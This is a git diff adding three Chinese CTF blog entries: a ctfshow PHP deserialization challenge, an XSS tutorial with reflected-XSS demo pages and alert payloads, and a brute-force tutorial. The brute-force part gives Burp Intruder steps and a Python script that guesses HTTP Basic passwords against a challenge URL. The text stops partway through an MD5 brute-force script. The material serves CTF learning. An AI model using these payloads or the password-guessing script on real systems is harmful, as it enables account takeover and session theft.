@@ -16,6 +16,242 @@
       </tags>
   </entry>
   <entry>
+    <title>DSBCTF--单身杯</title>
+    <url>/2024/11/11/DSBCTF-%E5%8D%95%E8%BA%AB%E6%9D%AF/</url>
+    <content><![CDATA[<h1 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h1><p>也是做上ctfshow双十一的单身杯了，在这里总结一下wp</p>
+<h1 id="0x02赛题"><a href="#0x02赛题" class="headerlink" title="0x02赛题"></a>0x02赛题</h1><h2 id="签到·好玩的PHP"><a href="#签到·好玩的PHP" class="headerlink" title="签到·好玩的PHP"></a>签到·好玩的PHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$d</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$s</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$ctf</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;d = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;s = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;s;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b = (<span class="keyword">string</span>)<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;s) &amp;&amp; (<span class="variable language_">$this</span>-&gt;d != <span class="variable language_">$this</span>-&gt;b) &amp;&amp; (<span class="variable language_">$this</span>-&gt;s != <span class="variable language_">$this</span>-&gt;b)) &#123;</span><br><span class="line">                <span class="variable">$dsb</span> = <span class="variable language_">$this</span>-&gt;d.<span class="variable language_">$this</span>-&gt;s.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((<span class="title function_ invoke__">strlen</span>(<span class="variable">$dsb</span>) &lt;= <span class="number">3</span>) &amp;&amp; (<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;ctf) &lt;= <span class="number">3</span>)) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="variable">$dsb</span> !== <span class="variable language_">$this</span>-&gt;ctf) &amp;&amp; (<span class="variable language_">$this</span>-&gt;ctf !== <span class="variable">$dsb</span>)) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$dsb</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;ctf)) &#123;</span><br><span class="line">                            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag.txt&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;dsbctf&quot;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>审代码:</p>
+<ul>
+<li>析构函数destruct()魔术方法会在对象调用结束或者对象销毁的时被调用，在魔术方法中，三个属性的值都被转换成字符串的类型</li>
+<li>赋值判断:判断三个参数之间是否两两不相等，如果满足将三个参数拼接赋值给dsb参数</li>
+<li>第一层判断:判断dsb和ctf两个参数的字符串长度是否都小于等于3</li>
+<li>第二层判断:通过弱比较判断两个参数的值和类型是否都不相等</li>
+<li>第三层判断:通过强比较判断这两个参数的md5值是否强相等</li>
+</ul>
+]]></content>
+      <categories>
+        <category>赛题wp</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web入门xss篇--ctfshow</title>
+    <url>/2024/11/05/web%E5%85%A5%E9%97%A8XSS%E7%AF%87-ctfshow/</url>
+    <content><![CDATA[<h1 id="XSS跨站漏洞"><a href="#XSS跨站漏洞" class="headerlink" title="XSS跨站漏洞"></a>XSS跨站漏洞</h1><p><img src="/./../image/achieve/202411/xss--ctfshow/5f70a851a75b0b3fe878509047de5fd6.png" alt="img"></p>
+<h2 id="0x01xss前言"><a href="#0x01xss前言" class="headerlink" title="0x01xss前言"></a>0x01xss前言</h2><p>之前对xss跨站攻击只是停留在概念的理解上，这次开始做ctfshow的xss部分，那就深入学习一下xss吧</p>
+<h2 id="0x02xss介绍"><a href="#0x02xss介绍" class="headerlink" title="0x02xss介绍"></a>0x02xss介绍</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><img src="/./../image/achieve/202411/xss--ctfshow/QQ20240925-135455.png" alt="img"></p>
+<p><img src="/./../image/achieve/202411/xss--ctfshow/1653879435_6294328b016b58c8721cf.png!small" alt="image"></p>
+<ul>
+<li>简单来说就是恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行</li>
+</ul>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>XSS (Cross Site Scripting) 攻击全称跨站脚本攻击，是一种经常出现在 Web 应用中的计算机安全漏洞。</p>
+<p>站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动<strong>态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容</strong>。动态站点会受到称XSS的威胁，而<strong>静态站点则完全不受其影响</strong>。</p>
+<p>  跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
+<p>  攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：<strong>跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</strong></p>
+<p>  xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以<strong>xss漏洞关键就是寻找参数未过滤的输出函数。</strong></p>
+<h3 id="利用的函数"><a href="#利用的函数" class="headerlink" title="利用的函数"></a>利用的函数</h3><p>比如说php中的脚本的输出函数</p>
+<p>  常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
+<h3 id="产生层面"><a href="#产生层面" class="headerlink" title="产生层面"></a>产生层面</h3><p><strong>产生层面一般都是在前端</strong>，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
+<h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><ol>
+<li>浏览器可以执行JavaScript代码（这不是废话吗）。</li>
+<li>网页可以显示用户输入的内容。包括但不限于：根据url中的参数渲染网页、预览输入框写好的内容、留言板等其他用户提交的内容等</li>
+</ol>
+<p>那么很显然这是被动的攻击，在之前并不流行，但是现在互联网主要讲求一个”互”,所以自然而然的也可以进行利用了，而能来干什么(最常见的钓鱼)，xss本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p>
+<h3 id="危害（能拿来干什么）"><a href="#危害（能拿来干什么）" class="headerlink" title="危害（能拿来干什么）"></a>危害（能拿来干什么）</h3><ul>
+<li>窃取cookie 或token 来获得用户登录态；</li>
+<li>劫持流量，把用户正在访问的页面跳转到钓鱼网站；</li>
+<li>盗用账户来转账、群发信息等；</li>
+<li>利用用户的设备来发起DDOS攻击；</li>
+<li>网站挂马</li>
+<li>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</li>
+<li>盗窃企业重要的具有商业价值的资料</li>
+</ul>
+<p>所以归根结底，x<strong>ss的攻击方式就是想办法”教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码</strong>。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上alert(“say something”)的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p>
+<ol>
+<li>窃取网页浏览中的cookie值。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</li>
+<li>劫持流量实现恶意跳转。这个很简单，就是在网页中想办法插入一句像这样的语句：<a href="http://www.baidu.com那么所访问的网站就会被跳转到百度的首页.早在2011年新浪就曾爆出过严重的xss漏洞,导致大量用户自动关注某个微博号并自动转发某条微博.具体各位可以自行百度./">http://www.baidu.com那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</a></li>
+</ol>
+<h3 id="利用环境"><a href="#利用环境" class="headerlink" title="利用环境"></a>利用环境</h3><p>利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
+<h2 id="0x03xss攻击"><a href="#0x03xss攻击" class="headerlink" title="0x03xss攻击"></a>0x03xss攻击</h2><p>XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
+<p>（1）来自内部的攻击<br>  主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
+<p>（2）来自外部的攻击<br>  主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
+<h2 id="0x04xss分类及介绍"><a href="#0x04xss分类及介绍" class="headerlink" title="0x04xss分类及介绍"></a>0x04xss分类及介绍</h2><h4 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h4><p>（1）原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
+<h4 id="2-攻击方式"><a href="#2-攻击方式" class="headerlink" title="2 攻击方式"></a>2 攻击方式</h4><p>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
+<h4 id="3-判断是否存在反射型xss漏洞并利用"><a href="#3-判断是否存在反射型xss漏洞并利用" class="headerlink" title="3 判断是否存在反射型xss漏洞并利用"></a>3 判断是否存在反射型xss漏洞并利用</h4><p>判断方法:判断有没有过滤一些特殊的字符串（比如对比输出的字符和输出的字符）,然后测试观察源代码有没有成功插入，如果可以插入那就构造payload进行注入</p>
+<p>这里简单写个demo来看看</p>
+<p>demo</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?x=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../image/achieve/202411/xss--ctfshow/07a1746c6488d6afa192ea6f9f8771ec.png" alt="img"></p>
+<p>传入后直接就出现弹窗了,说明我们的恶意代码被解析插入网页中了，但这个demo相对简单，不能更好的理解攻击原理，我们再举个demo看看</p>
+<p>这里我就直接拿我朋友的demo来介绍了</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;%= request.getParameter(&quot;</span>message<span class="string">&quot;) == null ? &quot;</span><span class="string">&quot; : request.getParameter(&quot;</span>message<span class="string">&quot;) %&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;%= request.getParameter(<span class="string">&quot;message&quot;</span>) == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : request.getParameter(<span class="string">&quot;message&quot;</span>) %&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果使用<code>Tomcat</code>来搭建一个本地服务，其中载入<code>jsp</code>漏洞代码，即可进行<code>xss</code>测试</p>
+<p>先简单的写个<code>xss_test.jsp</code>直接用来测试的</p>
+<p>我们直接在输入框中输入</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现弹窗成功，我们再看看代码</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;XSS 测试页面&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;XSS 测试页面&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;xss_test.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;输入消息:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> id=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span> value=<span class="string">&quot;&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;&quot;</span>&gt;</span><br><span class="line">    &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;</span><br><span class="line">    您输入的消息是：&lt;script&gt;alert(<span class="string">&#x27;XSS&#x27;</span>);&lt;/script&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到我们的恶意代码插入了刚刚的输入框，也就是被放进源码之中解析了。</p>
+<p>到这里很多人就要问了，这个payload是什么，看不懂一点，那就先介绍一下payload</p>
+<p>分析payload</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>&lt;script&gt;</code>标签用于在HTML文档中嵌入或引用JavaScript代码。浏览器会执行<code>&lt;script&gt;</code>标签内的代码。</li>
+<li><code>alert(&#39;XSS&#39;)</code>是一个JavaScript函数调用，用于在浏览器中弹出一个警告框，显示文本“XSS”。</li>
+</ul>
+<p>XSS 的攻击构造与理解异常简单与轻松，难点在于各种绕过手段。</p>
+]]></content>
+      <categories>
+        <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>web入门爆破篇-ctfshow</title>
+    <url>/2024/11/05/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/</url>
+    <content><![CDATA[<h1 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h1><h2 id="暴力破解原理"><a href="#暴力破解原理" class="headerlink" title="暴力破解原理"></a>暴力破解原理</h2><p>暴力破解实际就是疯狂的输入密码进行尝试登录，针对有的人喜欢用一些个人信息当做密码，有的人喜欢用一些很简单的低强度密码，我们就可以针对性的生成一个字典，用脚本或者工具挨个去尝试登录。</p>
+<h2 id="暴力破解前提"><a href="#暴力破解前提" class="headerlink" title="暴力破解前提"></a>暴力破解前提</h2><p>1.没安装waf，或者安装了waf没有开启流量拦截</p>
+<p>2.没有规定输入密码多少次后无法继续输入</p>
+<p>3.没有验证码，或者验证码生成在数据包中与输入的验证码进行比对。</p>
+<p>4.判定输入密码次数等是根据数据包中的ip等判定，我们就可以用字典变换ip去绕过</p>
+<h2 id="burpsuite爆破的四种模式"><a href="#burpsuite爆破的四种模式" class="headerlink" title="burpsuite爆破的四种模式"></a>burpsuite爆破的四种模式</h2><p>四种模式分别为：Sniper、Battering ram、Pitchfork、 Cluster bomb(推荐使用)</p>
+<h2 id="1-Sniper-狙击手"><a href="#1-Sniper-狙击手" class="headerlink" title="1.Sniper(狙击手)"></a>1.Sniper(狙击手)</h2><p>作为比较常用的模式，Sniper的作用是对其中选定的参数一个一个依次遍历字典并且替换然后测试。sniper只能默认对第一个参数进行修改，而无法对两个参数同时进行爆破。</p>
+<h2 id="2-Battering-ram-攻城锤"><a href="#2-Battering-ram-攻城锤" class="headerlink" title="2.Battering ram(攻城锤)"></a>2.Battering ram(攻城锤)</h2><p>不同于sniper，Battering ram是两个参数同时进行遍历一个字典的</p>
+<h2 id="3-Pitchfork-草叉模式"><a href="#3-Pitchfork-草叉模式" class="headerlink" title="3.Pitchfork(草叉模式)"></a>3.Pitchfork(草叉模式)</h2><p>Pitchfork作为多字典，他的特点也非常明显，就是多个字典同时进行，与Battering ram有些相似之处，但是一个是多个人跑一个赛道，而一个是多个人，各有各的赛道。</p>
+<h2 id="4-Cluster-bomb-集束炸弹-推荐爆破时使用"><a href="#4-Cluster-bomb-集束炸弹-推荐爆破时使用" class="headerlink" title="4.Cluster bomb(集束炸弹)(推荐爆破时使用)"></a>4.Cluster bomb(集束炸弹)(推荐爆破时使用)</h2><p>Cluster bomb兼备了前面三种模式的所有的功能，那就是全部遍历，不放过所有情况，但是在超大字典的情况下，运算能力就限制了Cluster bomb模式的发挥，所以只要算力足够，那爆破出密码就不是问题。</p>
+<h1 id="web21基础爆破工具的使用"><a href="#web21基础爆破工具的使用" class="headerlink" title="web21基础爆破工具的使用"></a>web21基础爆破工具的使用</h1><p>1.查看题目</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/1356dd000ac142fc809e0999f53aeb05.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>是一道登录题，</p>
+<p>此题主要考察基础的爆破</p>
+<h2 id="方法一-bp爆破"><a href="#方法一-bp爆破" class="headerlink" title="方法一:bp爆破"></a>方法一:bp爆破</h2><p>1：假设已知用户名是admin</p>
+<p>2：打开代理和Burp Suite，随便输入密码尝试登陆同时利用Burp Suite抓包。</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/3cc4f460204f49ceab82954db935acc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<h3 id="知识点-Authorization请求头"><a href="#知识点-Authorization请求头" class="headerlink" title="知识点:Authorization请求头"></a>知识点:Authorization请求头</h3><p>Authorization请求头用于验证是否有从服务器访问所需数据的权限。</p>
+<p>3：得到Authorization: Basic YWRtaW46YWRtaW4&#x3D; 可以看到他数据包是通过加密发送的，并且前面有Basic,对后面的 进行base64解码查看格为 admin：密码</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/5418433a13e443f1bcb02102de98d502.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>4：查看Authorization请求头观察发现是base64编码 我们将请求包发送到intruder中，选择sniper模式。选择base64内容Authorization: Basic YWRtaW46YWRtaW4&#x3D;，添加为playload position</p>
+<p>5：然后payload选择Custom iterator，根据已知格式，我们设置第一组payload位账号：admin，第二组一个冒号:，第三组密码：密码字典。 接下来设置Payload Processing的base64加密，点击add，选择encode&gt;Base64-encode，最后将PayLoad Encoding取消选择urlencode加密特俗字符串。</p>
+<p>6：进行爆破，找到长度不同的即为正确答案。</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/95e8a69e415a4801ab7065cfa422146a.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<p>找到flag。</p>
+<h2 id="方法二-自动爆破脚本"><a href="#方法二-自动爆破脚本" class="headerlink" title="方法二:自动爆破脚本"></a>方法二:自动爆破脚本</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time<span class="comment">#用于延时</span></span><br><span class="line"><span class="keyword">import</span> requests<span class="comment">#用于发送请求</span></span><br><span class="line"><span class="keyword">import</span> base64<span class="comment">#用于base64编码</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://ededa0b4-a3d7-43f0-9f06-c8db1fce2434.challenge.ctf.show/index.php&#x27;</span><span class="comment">#放入url</span></span><br><span class="line"></span><br><span class="line">password = []<span class="comment">#密码列表</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#读取密码字典/1.txt是字典密码</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:<span class="comment">#循环读取密码字典</span></span><br><span class="line">        data = f.readline() <span class="comment">#读取一行</span></span><br><span class="line">        <span class="keyword">if</span> data:<span class="comment">#判断是否为空</span></span><br><span class="line">            password.append(data)<span class="comment">#添加到列表</span></span><br><span class="line">        <span class="keyword">else</span>:<span class="comment">#判断是否到达文件末尾</span></span><br><span class="line">            <span class="keyword">break</span><span class="comment">#结束循环</span></span><br><span class="line">        </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> password:<span class="comment">#循环遍历密码列表</span></span><br><span class="line">    strs = <span class="string">&#x27;admin:&#x27;</span>+ p[:-<span class="number">1</span>]<span class="comment">#拼接用户名和密码</span></span><br><span class="line">    header=&#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>:<span class="string">&#x27;Basic &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(base64.b64encode(strs.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    &#125;<span class="comment">#设置请求头</span></span><br><span class="line">    rep =requests.get(url,headers=header)<span class="comment">#发送请求</span></span><br><span class="line">    time.sleep(<span class="number">0.2</span>)<span class="comment">#延时0.2秒</span></span><br><span class="line">    <span class="keyword">if</span> rep.status_code ==<span class="number">200</span>:<span class="comment">#判断请求是否成功</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(rep.text)<span class="comment">#打印响应内容</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h1 id="web23条件爆破"><a href="#web23条件爆破" class="headerlink" title="web23条件爆破"></a>web23条件爆破</h1><p>1.查看题目</p>
+<p><img src="/./../image/achieve/202411/web%E5%85%A5%E9%97%A8%E7%88%86%E7%A0%B4%E7%AF%87-ctfshow/7a9fe5418c734bc885623e1945fba644.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p>
+<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数:"></a>substr()函数:</h2><p>substr($string, start, length)函数用于从字符串$string中提取从start位置开始的length个字符。如果length省略，则默认提取到字符串的末尾。</p>
+<ul>
+<li>if(substr($token, 1,1)&#x3D;&#x3D;&#x3D;substr($token, 14,1) &amp;&amp; substr($token, 14,1) &#x3D;&#x3D;&#x3D;substr($token, 17,1)):</li>
+</ul>
+<p>检验$token的第一个字符，第14个字符是否相等，第14个字符和第17个字符是否相等</p>
+<ul>
+<li>if((intval(substr($token, 1,1))+intval(substr($token, 14,1))+substr($token, 17,1))&#x2F;substr($token, 1,1)&#x3D;&#x3D;&#x3D;intval(substr($token, 31,1))):</li>
+</ul>
+<p>第一个+第14个+第17个&#x3D;第31个</p>
+<p>GET一个参数token，token的MD5加密后的值如果满足下面的判断，就输出flag</p>
+<h2 id="用爆破脚本"><a href="#用爆破脚本" class="headerlink" title="用爆破脚本"></a>用爆破脚本</h2><h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib<span class="comment">#导入hashlib模块</span></span><br><span class="line">dic = <span class="string">&quot;0123456789qazwsxedcrfvtgbyhnujmikolp&quot;</span><span class="comment">#定义字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> dic:<span class="comment">#遍历字典</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> dic:<span class="comment">#遍历字典</span></span><br><span class="line">        t = <span class="built_in">str</span>(a)+<span class="built_in">str</span>(b)<span class="comment">#拼接字符串</span></span><br><span class="line">        md5 = hashlib.md5(t.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()<span class="comment">#计算md5值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> md5[<span class="number">1</span>:<span class="number">2</span>] == md5[<span class="number">14</span>:<span class="number">15</span>] <span class="keyword">and</span> md5[<span class="number">14</span>:<span class="number">15</span>] == md5[<span class="number">17</span>:<span class="number">18</span>]:<span class="comment">#判断md5值是否符合条件</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(md5[<span 